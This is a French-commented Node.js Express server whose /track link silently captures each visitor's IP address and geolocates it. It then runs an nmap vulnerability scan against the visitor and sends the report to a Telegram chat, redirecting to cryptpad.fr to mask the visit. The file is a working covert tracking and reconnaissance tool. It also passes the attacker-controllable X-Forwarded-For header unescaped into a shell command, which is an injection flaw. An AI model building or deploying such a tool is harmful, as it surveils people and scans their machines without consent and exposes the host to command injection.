require('dotenv').config(); // Charger les variables d'environnement

const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const REDIRECT_URL = process.env.REDIRECT_URL || 'https://cryptpad.fr';  // URL par défaut si non définie

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN);

function cleanVulnerabilityLine(line) {
    return line.replace(/^[|\\_\-]+\s*/, '').trim();  // Supprimer les caractères inutiles
}

function createCveLink(line) {
    const cveMatch = line.match(/CVE-\d{4}-\d+/);
    if (cveMatch) {
        const cveId = cveMatch[0];
        return line.replace(
            cveId,
            `<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=${cveId}" target="_blank">${cveId}</a>`
        );
    }
    return line;
}

function parseCriticalVulnerabilities(nmapResults) {
    const criticalVulns = nmapResults
        .split('\n')
        .filter(line => line.includes('CVE') || line.toLowerCase().includes('vulnerable'))
        .map(vuln => `🔴 ${createCveLink(cleanVulnerabilityLine(vuln))}`);
    return criticalVulns.length > 0
        ? criticalVulns.map(vuln => `<p>${vuln}</p>`).join('')
        : '<p>✅ Aucune vulnérabilité critique détectée.</p>';
}

function detectCriticalServices(nmapResults) {
    const criticalServices = [
        { port: 22, name: 'SSH' },
        { port: 80, name: 'HTTP' },
        { port: 443, name: 'HTTPS' },
        { port: 3389, name: 'RDP' }
    ];
    return criticalServices.map(service => {
        const serviceOpen = nmapResults.includes(`${service.port}/tcp open`);
        return {
            port: service.port,
            name: service.name,
            status: serviceOpen ? 'Ouvert 🔴' : 'Fermé ✅'
        };
    });
}

function parseOpenPorts(nmapResults) {
    const lines = nmapResults.split('\n');
    const openPorts = [];
    lines.forEach(line => {
        const portInfo = line.match(/^(\d+\/tcp)\s+open\s+([^\s]+)/);
        if (portInfo) {
            openPorts.push({
                port: portInfo[1],
                service: portInfo[2]
            });
        }
    });
    return openPorts;
}

async function generateHtmlReport(filePath, geoInfo, scanDuration, portsScanned, criticalVulns, detectedServices, openPorts) {
    const mapLink = `https://www.google.com/maps?q=${geoInfo.lat},${geoInfo.lon}`;

    const htmlContent = `
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rapport de Scan</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 10px;
            background-color: #f4f4f4;
        }

        h1 {
            font-size: 26px;
            text-align: center;
            color: #333;
            margin-bottom: 20px;
            word-wrap: break-word;
            overflow-wrap: break-word;
        }

        h2 {
            font-size: 20px;
            color: #444;
            margin-bottom: 10px;
        }

        .section {
            background-color: #ffffff;
            padding: 15px;
            margin-bottom: 15px;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }

        p {
            font-size: 16px;
            margin: 5px 0;
            overflow-wrap: break-word;
        }

        a {
            color: #007bff;
            text-decoration: none;
            font-weight: bold;
        }

        a:hover {
            text-decoration: underline;
        }

        .vulnerabilities {
            background-color: #fef4f4;
            padding: 10px;
            border-radius: 5px;
            font-size: 15px;
            color: #333;
            overflow-wrap: break-word;
            line-height: 1.6;
        }

        .vulnerabilities p {
            margin: 5px 0;
        }

        .row {
            display: flex;
            justify-content: space-between;
            padding: 10px;
            background-color: #fafafa;
            border-radius: 5px;
            margin-bottom: 5px;
        }

        .row:nth-child(even) {
            background-color: #f0f0f0;
        }

        .cell {
            font-size: 15px;
        }

        .cell strong {
            color: #444;
        }

        @media (max-width: 768px) {
            h1 {
                font-size: 22px;
            }

            p, .cell {
                font-size: 14px;
            }

            .section {
                padding: 10px;
            }

            .row {
                flex-direction: column;
                padding: 8px;
            }

            .cell {
                margin-bottom: 5px;
            }
        }
    </style>
</head>
<body>
    <h1>Rapport de Scan de l’IP : ${geoInfo.ip}</h1>

    <div class="section">
        <h2>🌍 Informations sur la cible</h2>
        <p><strong>Pays :</strong> ${geoInfo.country}</p>
        <p><strong>FAI :</strong> ${geoInfo.isp}</p>
        <p><strong>Durée du scan :</strong> ${scanDuration} secondes</p>
        <p><strong>Ports scannés :</strong> ${portsScanned}</p>
        <p><strong>Lien vers la carte :</strong> <a href="${mapLink}" target="_blank">Google Maps</a></p>
    </div>

    <div class="section">
        <h2>⚠️ Services critiques détectés</h2>
        ${detectedServices.map(service => `
        <div class="row">
            <div class="cell"><strong>Port :</strong> ${service.port}</div>
            <div class="cell"><strong>Service :</strong> ${service.name}</div>
            <div class="cell"><strong>Statut :</strong> ${service.status}</div>
        </div>
        `).join('')}
    </div>

    <div class="section">
        <h2>🌐 Ports ouverts détectés</h2>
        ${openPorts.length > 0 ? openPorts.map(port => `
        <div class="row">
            <div class="cell"><strong>Port :</strong> ${port.port}</div>
            <div class="cell"><strong>Service :</strong> ${port.service}</div>
        </div>
        `).join('') : `<p>Aucun port ouvert détecté</p>`}
    </div>

    <div class="section">
        <h2>⚠️ Vulnérabilités critiques détectées</h2>
        <div class="vulnerabilities">
            ${criticalVulns}
        </div>
    </div>
</body>
</html>
    `;
    await fs.promises.writeFile(filePath, htmlContent, { encoding: 'utf8' });
}

async function generateReport(ip, geoInfo) {
    const timestamp = new Date().toISOString().replace(/[:]/g, '-');
    const sanitizedIp = ip.replace(/[:]/g, '_');
    const reportPath = path.resolve(`scans/${sanitizedIp}_${timestamp}_report.html`);
    const nmapCommand = `nmap -6 --script vuln -oN nmap_results.txt ${ip}`;

    if (!fs.existsSync('scans')) {
        fs.mkdirSync('scans');
    }

    console.log(`🔍 Lancement du scan de vulnérabilités sur l’IP : ${ip}`);
    const startTime = Date.now();

    exec(nmapCommand, async (error, stdout, stderr) => {
        const scanDuration = ((Date.now() - startTime) / 1000).toFixed(2);
        if (error) {
            console.error(`❌ Erreur lors du scan Nmap : ${error.message}`);
            return;
        }
        if (stderr) {
            console.error(`⚠️ Avertissement Nmap : ${stderr}`);
        }

        console.log(`✅ Scan terminé.`);

        try {
            const nmapResults = await fs.promises.readFile('nmap_results.txt', 'utf8');
            const criticalVulns = parseCriticalVulnerabilities(nmapResults);
            const portsScanned = (nmapResults.match(/open|closed|filtered/g) || []).length;
            const detectedServices = detectCriticalServices(nmapResults);
            const openPorts = parseOpenPorts(nmapResults);

            await generateHtmlReport(reportPath, geoInfo, scanDuration, portsScanned, criticalVulns, detectedServices, openPorts);

            console.log(`✅ Rapport HTML généré : ${reportPath}`);

            await bot.sendDocument(CHAT_ID, reportPath);
        } catch (err) {
            console.error(`❌ Erreur lors de la génération du rapport : ${err.message}`);
        }
    });
}

app.get('/track', async (req, res) => {
    try {
        const rawIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const ip = Array.isArray(rawIP) ? rawIP[0] : rawIP.split(',')[0].trim();
        console.log(`🚀 IP capturée : ${ip}`);

        const geoResponse = await axios.get(`http://ip-api.com/json/${ip}`);
        const geoInfo = {
            ip,
            country: geoResponse.data.country,
            regionName: geoResponse.data.regionName,
            city: geoResponse.data.city,
            isp: geoResponse.data.isp,
            lat: geoResponse.data.lat,
            lon: geoResponse.data.lon
        };

        await generateReport(ip, geoInfo);
        
        res.redirect(REDIRECT_URL);
    } catch (error) {
        console.error('❌ Erreur lors du traitement de la requête :', error);
        res.status(500).send('Erreur interne du serveur');
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Serveur actif sur http://localhost:${PORT}`);
});
